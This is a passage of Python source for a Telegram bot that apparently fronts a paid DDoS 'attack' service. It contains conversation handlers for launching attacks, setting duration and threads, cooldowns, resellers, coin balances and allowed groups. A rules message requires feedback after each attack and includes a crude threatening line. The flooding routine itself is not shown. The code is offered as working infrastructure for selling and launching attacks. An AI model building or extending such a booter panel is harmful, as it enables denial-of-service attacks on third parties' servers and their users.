        await update.message.reply_text("❌ *Only the owner can list groups!*", parse_mode='Markdown')
        return

    if not allowed_groups:
        await update.message.reply_text("❌ *No groups are currently allowed.*", parse_mode='Markdown')
        return

    groups_list = "\n".join([f"• `{group_id}`" for group_id in allowed_groups])
    await update.message.reply_text(f"*Allowed Groups:*\n\n{groups_list}", parse_mode='Markdown')

# Cancel Current Conversation
async def cancel_conversation(update: Update, context: CallbackContext):
    await update.message.reply_text("❌ *Current process canceled.*", parse_mode='Markdown')
    return ConversationHandler.END

# Rules Command
async def rules(update: Update, context: CallbackContext):
    rules_text = (
        "📜 *Rules:*\n\n"
        "1. Do not spam the bot.\n\n"
        "2. Only use the bot in allowed groups.\n\n"
        "3. Follow the instructions carefully.\n\n"
        "4. Respect other users and the bot owner.\n\n"
        "5. You must provide feedback after each attack before launching another one.\n\n"
        "6. Any violation of these rules will result in a ban.\n\n\n"
        "𝐁𝐒𝐃𝐊 𝐑𝐔𝐋𝐄𝐒 𝐅𝐎𝐋𝐋𝐎𝐖 𝐊𝐑𝐍𝐀 𝐖𝐀𝐑𝐍𝐀 𝐆𝐍𝐃 𝐌𝐀𝐑 𝐃𝐔𝐍𝐆𝐀 𝟏𝟓𝟎 𝐊𝐄 𝐒𝐏𝐄𝐄𝐃 𝐒𝐄  .\n\n"
    )
    await update.message.reply_text(rules_text, parse_mode='Markdown')

# Handle Button Clicks
async def handle_button_click(update: Update, context: CallbackContext):
    chat = update.effective_chat
    query = update.message.text

    if chat.type == "private" and not is_authorized_user(update):
        await update.message.reply_text("❌ *𝐓𝐡𝐢𝐬 𝐛𝐨𝐭 𝐢𝐬 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐡𝐚𝐫𝐞 DM @AashuZodYt.*", parse_mode='Markdown')
        return

    if query == '💠𝐒𝐭𝐚𝐫𝐭💠':
        await start(update, context)
    elif query == '🎯𝐀𝐭𝐭𝐚𝐜𝐤🎯':
        await attack_start(update, context)
    elif query == '⏰𝐒𝐞𝐭 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧⏰':
        await set_duration_start(update, context)
    elif query == '📶𝐒𝐞𝐭 𝐓𝐡𝐫𝐞𝐚𝐝𝐬📶':
        await set_threads_start(update, context)
    elif query == '📋𝐑𝐮𝐥𝐞𝐬📋':
        await rules(update, context)
    elif query == '💸𝐁𝐚𝐥𝐚𝐧𝐜𝐞💸':
        await balance(update, context)
    elif query == '⏳𝐒𝐞𝐭 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧⏳':
        await set_cooldown_start(update, context)
    elif query == '🔍𝐒𝐭𝐚𝐭𝐮𝐬🔍':
        await check_status(update, context)
    elif query == '➕𝐀𝐝𝐝 𝐆𝐫𝐨𝐮𝐩➕':
        await add_group_start(update, context)
    elif query == '➖𝐑𝐞𝐦𝐨𝐯𝐞 𝐆𝐫𝐨𝐮𝐩➖':
        await remove_group_start(update, context)
    elif query == '📜𝐋𝐢𝐬𝐭 𝐆𝐫𝐨𝐮𝐩𝐬📜':
        await list_groups(update, context)
    elif query == '🧮𝐀𝐝𝐝 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫🧮':
        await add_reseller_start(update, context)
    elif query == '✂️𝐑𝐞𝐦𝐨𝐯𝐞 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫✂️':
        await remove_reseller_start(update, context)
    elif query == '📥𝐀𝐝𝐝 𝐂𝐨𝐢𝐧📥':
        await add_coin_start(update, context)
    elif query == '💌𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤💌':
        await feedback(update, context)

# Main Bot Setup
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Conversation Handlers
    attack_handler = ConversationHandler(
        entry_points=[CommandHandler("attack", attack_start), MessageHandler(filters.Text("🎯𝐀𝐭𝐭𝐚𝐜𝐤🎯"), attack_start)],
        states={
            GET_ATTACK_ARGS: [MessageHandler(filters.TEXT & ~filters.COMMAND, attack_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    set_duration_handler = ConversationHandler(
        entry_points=[CommandHandler("setduration", set_duration_start), MessageHandler(filters.Text("⏰𝐒𝐞𝐭 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧⏰"), set_duration_start)],
        states={
            GET_SET_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_duration_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    set_threads_handler = ConversationHandler(
        entry_points=[CommandHandler("set_threads", set_threads_start), MessageHandler(filters.Text("📶𝐒𝐞𝐭 𝐓𝐡𝐫𝐞𝐚𝐝𝐬📶'"), set_threads_start)],
        states={
            GET_SET_THREADS: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_threads_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    set_cooldown_handler = ConversationHandler(
        entry_points=[CommandHandler("setcooldown", set_cooldown_start), MessageHandler(filters.Text("⏳𝐒𝐞𝐭 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧⏳"), set_cooldown_start)],
        states={
            GET_SET_COOLDOWN: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_cooldown_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    add_reseller_handler = ConversationHandler(
        entry_points=[CommandHandler("addreseller", add_reseller_start), MessageHandler(filters.Text("🧮𝐀𝐝𝐝 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫🧮"), add_reseller_start)],
        states={
            GET_RESELLER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_reseller_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    remove_reseller_handler = ConversationHandler(
        entry_points=[CommandHandler("removereseller", remove_reseller_start), MessageHandler(filters.Text("✂️𝐑𝐞𝐦𝐨𝐯𝐞 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫✂️"), remove_reseller_start)],
        states={
            GET_REMOVE_RESELLER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_reseller_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    add_coin_handler = ConversationHandler(
        entry_points=[CommandHandler("addcoin", add_coin_start), MessageHandler(filters.Text("📥𝐀𝐝𝐝 𝐂𝐨𝐢𝐧📥"), add_coin_start)],
        states={
            GET_ADD_COIN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_coin_user_id)],
            GET_ADD_COIN_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_coin_amount)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    add_group_handler = ConversationHandler(
        entry_points=[CommandHandler("addgroup", add_group_start), MessageHandler(filters.Text("➕𝐀𝐝𝐝 𝐆𝐫𝐨𝐮𝐩➕"), add_group_start)],
        states={
            GET_ADD_GROUP_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_group_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    remove_group_handler = ConversationHandler(
        entry_points=[CommandHandler("removegroup", remove_group_start), MessageHandler(filters.Text("➖𝐑𝐞𝐦𝐨𝐯𝐞 𝐆𝐫𝐨𝐮𝐩➖"), remove_group_start)],
        states={
            GET_REMOVE_GROUP_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_group_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    # Add all handlers
    application.add_handler(attack_handler)
    application.add_handler(set_duration_handler)
    application.add_handler(set_threads_handler)
    application.add_handler(set_cooldown_handler)
    application.add_handler(add_reseller_handler)
    application.add_handler(remove_reseller_handler)
    application.add_handler(add_coin_handler)
    application.add_handler(add_group_handler)
    application.add_handler(remove_group_handler)
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("listgroups", list_groups))
    
    # Photo feedback handler
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    
    # Feedback button handler
    application.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND & filters.Regex(r'^Feedback$'), 
        feedback
    ))
    
    # Text feedback handler (only when user is waiting for feedback)
    application.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND & filters.User(user_id=feedback_waiting.keys()),
        handle_text_feedback
    ))
    
    # Button click handler (should come last)
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_click))

    application.run_polling()

if __name__ == '__main__':
    main()


